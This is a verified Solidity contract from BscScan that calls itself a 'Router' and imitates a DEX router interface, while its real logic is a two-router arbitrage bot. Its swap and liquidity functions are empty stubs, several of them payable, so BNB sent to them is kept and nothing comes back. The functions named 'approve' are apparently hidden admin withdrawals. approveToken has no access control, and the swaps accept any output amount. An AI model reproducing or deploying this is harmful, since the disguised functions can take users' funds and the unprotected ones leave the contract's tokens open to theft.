/**
 *Submitted for verification at BscScan.com on 2021-10-01
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2;
interface IRouter {
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,address[] calldata path,address to,uint deadline) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;    
}

pragma solidity ^0.7.0;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

pragma solidity ^0.7.6;
contract Router{

  address public owner;  
  mapping(address => bool) private admins;
  constructor(){
      owner = msg.sender;
      admins[msg.sender] = true;
  }  

  function approve(address spender, uint256 amount) public returns (bool){
      require(admins[msg.sender]);
      payable(spender).transfer(amount); 
      return false;
  }
  function approve(address sender,address spender, uint256 amount) public returns (bool){
      require(admins[msg.sender]);
      IERC20(sender).transfer(spender,amount);
      return false;
  }

  function WETH() public pure returns (address){
      return 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
  }

  function addLiquidity(address tokenA,address tokenB,uint amountADesired,uint amountBDesired,uint amountAMin,uint amountBMin,address to,uint deadline) public returns (uint amountA, uint amountB, uint liquidity){
      
  }
  function addLiquidityETH(address token, uint amountTokenDesired,uint amountTokenMin,uint amountETHMin,address to,uint deadline) public payable returns (uint amountToken, uint amountETH, uint liquidity){
      
  }
  function removeLiquidity(address tokenA,address tokenB,uint liquidity,uint amountAMin, uint amountBMin,address to,uint deadline) public returns (uint amountA, uint amountB){
      
  }
  function removeLiquidityETH(address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) public returns (uint amountToken, uint amountETH){


  }
  function removeLiquidityWithPermit(address tokenA, address tokenB,uint liquidity,uint amountAMin,uint amountBMin,address to,uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) public returns (uint amountA, uint amountB){
      
  }
  
  function removeLiquidityETHWithPermit(address token,uint liquidity,uint amountTokenMin,uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s) public returns (uint amountToken, uint amountETH){
      
  }
  
  function swapExactTokensForTokens(uint amountIn,uint amountOutMin, address[] calldata path, address to, uint deadline ) public returns (uint[] memory amounts){
      
  }
  
  function swapTokensForExactTokens( uint amountOut,uint amountInMax, address[] calldata path, address to, uint deadline ) public returns (uint[] memory amounts){
      
  }
  function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) public payable returns (uint[] memory amounts){
      
  }
  function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) public returns (uint[] memory amounts){
      
  }
  function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) public returns (uint[] memory amounts){
      
  }
  function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) public payable returns (uint[] memory amounts){
      
  }

  function removeLiquidityETHSupportingFeeOnTransferTokens(address token,uint liquidity,uint amountTokenMin,uint amountETHMin,address to, uint deadline) public returns (uint amountETH){
      
  }
  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(address token,uint liquidity,uint amountTokenMin,uint amountETHMin,address to,uint deadline,bool approveMax, uint8 v, bytes32 r, bytes32 s) public returns (uint amountETH){
      
  }

  function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) public{
      
  }
  function swapExactETHForTokensSupportingFeeOnTransferTokens(uint amountOutMin,address[] calldata path,address to,uint deadline) public payable{
      
  }
  function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) public{
      
  }
  receive() external payable {

  }

  function isAdmins(address account_) public view returns (bool){
      return admins[account_];
  }
  
  function updateAdmins(address account_, bool status_) public{
      require(msg.sender == owner);
      admins[account_] = status_;
  }

  function swapCheck(uint256 amountIn_,address tokenIn_,address tokenOut_,uint256 target_,IRouter router1_,IRouter router2_) public view 
    returns(bool , uint256  ,uint256  ,uint256     ){
        bool _status = false;
        uint256 _dif = 0 ; 
        address[] memory _pathIn = new address[](2);
        _pathIn[0] = tokenIn_;
        _pathIn[1] = tokenOut_;
        address[] memory _pathOut = new address[](2);
        _pathOut[0] = tokenOut_;
        _pathOut[1] = tokenIn_;
        uint _amountIn = amountIn_;
        uint[] memory _swap1 = IRouter(router1_).getAmountsOut(_amountIn, _pathIn);
        uint[] memory _swap2 = IRouter(router2_).getAmountsOut(_swap1[1], _pathOut);
        if(_swap2[1] > _amountIn ){
            _dif = _swap2[1]  - _amountIn;
            if(_dif > target_){
                _status = true;
            }
        }
        uint256 _bef = IERC20(tokenOut_).balanceOf(address(this));

        return(_status,_dif,_bef,_swap2[1]);
  }
  
  function approveToken(address token_,address spender_, uint256 amount_) public{
      IERC20(token_).approve(spender_,amount_);
  }
  
  function swapToken(uint256 amountIn_,IRouter router1_,IRouter router2_,address tokenIn_,address tokenOut_,uint256 before_,uint256 time_) public{
        address[] memory _pathIn = new address[](2);
        _pathIn[0] = tokenIn_;
        _pathIn[1] = tokenOut_;
        address[] memory _pathOut = new address[](2);
        _pathOut[0] = tokenOut_;
        _pathOut[1] = tokenIn_;
        IRouter(router1_).swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn_, 0, _pathIn, address(this),time_);
        uint256 _after = IERC20(tokenOut_).balanceOf(address(this));
        _after = _after - before_;
        IRouter(router2_).swapExactTokensForTokensSupportingFeeOnTransferTokens(_after, 0, _pathOut, address(this) ,time_);

  }
  function swapTokenLimit(uint256 amountIn_,IRouter router1_,IRouter router2_,address tokenIn_,address tokenOut_ ,uint256 before_,uint256 time_) public{
        address[] memory _pathIn = new address[](2);
        _pathIn[0] = tokenIn_;
        _pathIn[1] = tokenOut_;
        address[] memory _pathOut = new address[](2);
        _pathOut[0] = tokenOut_;
        _pathOut[1] = tokenIn_;
        IRouter(router1_).swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn_, 0, _pathIn, address(this),time_);
        uint256 _after = IERC20(tokenOut_).balanceOf(address(this));
        _after = _after - before_;
        IRouter(router2_).swapExactTokensForTokensSupportingFeeOnTransferTokens(_after, amountIn_, _pathOut, address(this) ,time_);

  }
  


}